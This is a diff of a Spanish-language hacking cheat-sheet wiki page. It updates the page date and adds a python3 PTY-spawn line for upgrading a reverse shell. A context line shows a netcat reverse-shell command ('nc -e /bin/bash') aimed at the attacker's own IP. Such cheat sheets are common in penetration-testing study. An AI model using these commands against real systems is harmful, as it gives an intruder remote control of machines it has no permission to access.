@@ -2,7 +2,7 @@
 title: CheatSheet
 description: Cheatsheet de todos los comandos usados en Hacking
 published: true
-date: 2024-12-26T15:53:01.875Z
+date: 2024-12-29T21:19:13.513Z
 tags: 
 editor: markdown
 dateCreated: 2024-12-20T19:29:53.236Z
@@ -38,6 +38,7 @@ sudo nohup nc -e /bin/bash (Nuestra IP) &
 ### Securizar la shell
 Para poder securizarla, deberemos escribir en la shell reversa lo siguiente:
 ```bash
+python3 -c "import pty;pty.spawn('/bin/bash')"
 python -c "import pty;pty.spawn('/bin/bash')"
 ```
 
